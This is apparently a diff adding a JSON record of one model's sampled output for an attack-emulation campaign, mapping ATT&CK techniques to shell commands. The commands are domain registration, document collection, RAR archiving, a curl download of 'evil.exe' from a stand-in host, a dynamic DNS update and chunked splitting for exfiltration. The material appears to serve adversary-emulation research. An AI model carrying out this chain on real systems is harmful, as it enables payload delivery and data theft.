@@ -1,0 +1,72 @@
+{
+  "campaign_id": "C0026",
+  "model": "qwen2.5-coder:14b",
+  "sample": 2,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-domain-registration",
+      "command": "nsupdate -k /path/to/keyfile",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "expired.example.com",
+        "new_domain": "renewed.example.com"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "local-file-collection",
+      "command": "find /path/to/documents -type f -newermt 2021-01-01 ! -newermt 2023-01-01",
+      "target": "target.primary",
+      "parameters": {
+        "directory": "/path/to/documents"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "winrar-archive",
+      "command": "winrar a -r /path/to/output.rar /path/to/documents/*.*",
+      "target": "target.primary",
+      "parameters": {
+        "output_file": "/path/to/output.rar",
+        "source_directory": "/path/to/documents"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "http-file-download",
+      "command": "curl -o /path/to/payload.bin http://endpoint.public_service/evil.exe",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "http://endpoint.public_service/evil.exe",
+        "output_file": "/path/to/payload.bin"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "dynamic-dns-update",
+      "command": "nsupdate -k /path/to/keyfile <<EOF\nserver dns.example.com\nupdate add subdomain.clouddns.com 300 A 192.168.1.1\nsend\nEOF",
+      "target": "actor.primary",
+      "parameters": {
+        "dns_server": "dns.example.com",
+        "subdomain": "subdomain.clouddns.com",
+        "ip_address": "192.168.1.1"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "chunked-exfiltration",
+      "command": "split -b 3M /path/to/output.rar /path/to/chunk_",
+      "target": "actor.primary",
+      "parameters": {
+        "input_file": "/path/to/output.rar",
+        "output_prefix": "/path/to/chunk_"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "55a0e23b9605b0a3f023524156eed5f6656da1ef712581b07b07c48dae1f4a71"
+}
